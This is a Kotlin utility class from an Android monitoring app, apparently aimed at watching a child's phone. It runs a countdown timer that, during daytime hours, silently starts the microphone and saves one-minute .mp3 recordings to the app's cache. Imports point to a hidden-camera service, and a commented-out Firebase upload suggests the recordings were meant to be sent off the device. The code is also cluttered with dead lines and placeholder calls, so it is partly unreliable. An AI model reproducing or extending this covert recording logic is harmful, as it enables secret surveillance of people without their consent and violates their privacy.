package com.github.midros.istheapp.utils


import android.media.MediaRecorder
import android.net.Uri
import android.os.CountDownTimer
import android.util.Log
import android.util.Log.i
import com.github.midros.istheapp.data.model.ChildPhoto
import com.github.midros.istheapp.data.model.ChildRecording
import com.github.midros.istheapp.data.model.Recording
import com.github.midros.istheapp.data.rxFirebase.InterfaceFirebase
import com.github.midros.istheapp.services.notificationService.InteractorNotificationService
import com.github.midros.istheapp.utils.Consts.TAG
import com.github.midros.istheapp.utils.FileHelper.deleteFile
import com.github.midros.istheapp.utils.FileHelper.getFileNameAudio
import com.github.midros.istheapp.utils.FileHelper.getFilePath
import com.github.midros.istheapp.utils.hiddenCameraServiceUtils.config.CameraFacing
//import com.pawegio.kandroid.i
import com.google.firebase.database.DatabaseReference
import io.reactivex.disposables.CompositeDisposable
import io.reactivex.schedulers.Schedulers
import java.io.File
import javax.inject.Inject
import io.reactivex.android.schedulers.AndroidSchedulers
import java.text.SimpleDateFormat
import java.util.*
import com.google.firebase.database.FirebaseDatabase

/**
 * Created by luis rafael on 19/03/18.
 */
class MyCountDownTimer(
    startTime: Long,
    interval: Long,
    private val timer: ((timer: Long) -> Unit)? = null,
    private val func: () -> Unit
) : CountDownTimer(startTime, interval) {


    @Inject
    lateinit var interactor: InteractorNotificationService

    @Inject
    lateinit var firebase: InterfaceFirebase
    private var startTime = (1 * 60 * 1440000).toLong()
    private var interval = (1 * 1000).toLong()

    //  private fun getReference(child: String):            DatabaseReference = firebase.getDatabaseReference(child)
    //   private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
    private var disposable: CompositeDisposable = CompositeDisposable()

    private var timer2: MyCountDownTimer? = null
    private var recorder: MediaRecorderUtils = MediaRecorderUtils {
        //    cancelTimer()
        FileHelper.deleteFile("hhh")
    }
    private var fileName: String? = null
    private var dateTime: String? = null
    private var nameAudio: String = ""

    // private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)

    override fun onFinish() = func()

    override fun onTick(t: Long) {
        i(TAG, "timerxx $t");

        //     val childRecording = ChildRecording(true, 60000)
        //    getReference("${Consts.RECORDING}/${Consts.PARAMS}").setValue(childRecording)
        var file =
            File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt")
        var fileExists = file.exists()
        val sdf = SimpleDateFormat("EEEE")
        val d = Date()
        val day = sdf.format(d)
        val rightNow = Calendar.getInstance()
        val hour: Int = rightNow.get(Calendar.HOUR_OF_DAY)
        //   val database = FirebaseDatabase.getInstance()
        //  val refStorage = FirebaseStorage.getInstance().reference.child("images/$fileName")
        try {
            if (hour >= 6 && hour <= 23) {
                if (!fileExists) {
                    val isNewFileCreated: Boolean = file.createNewFile()
// 1 min = 60 * 1000
                    timer2 = MyCountDownTimer(1 * 60 * 1000, (1 * 60000).toLong(), {
                        //         setIntervalRecord(it)
                        i(TAG, "timerxx $t");
                    }) {
                        recorder.stopRecording {
                            sendFileCall()
                        }
                        Log.i("finishRecording", "finishRecording")

//                val filePath = "/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/"  // /${Consts.ADDRESS_AUDIO_RECORD}"
//                val dateName = fileName!!.replace("$filePath/", "")
//                val uri = Uri.fromFile(File(fileName))

//                    fileName = fileName?.replace(".mp3", ".txt")?.replace("audioRecord", "txts")
//                    var file2 = File(fileName)
//                    val isNewFileCreated2: Boolean = file2.createNewFile()
//                    val isNewFileCreated: Boolean = file.delete()
                    }

                    nameAudio = ConstFun.getRandomNumeric()
                    dateTime = ConstFun.getDateTime().replace(":", "-").replace(".", "")
                    fileName = "/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/" + dateTime + ".mp3" //context.getFileNameAudio(nameAudio, dateTime)

                    recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
                    timer2!!.start()
                    i(TAG, "incia record stick $t");
                }
            }
        } catch (e: Throwable) {
//            sendFile()
            Log.i("error", e.message.toString())
    //        e(Consts.TAG, e.message.toString())
            //  errorAction()
        }
    }

    private fun sendFileCall() {
        i(TAG, "finnn");
    }
}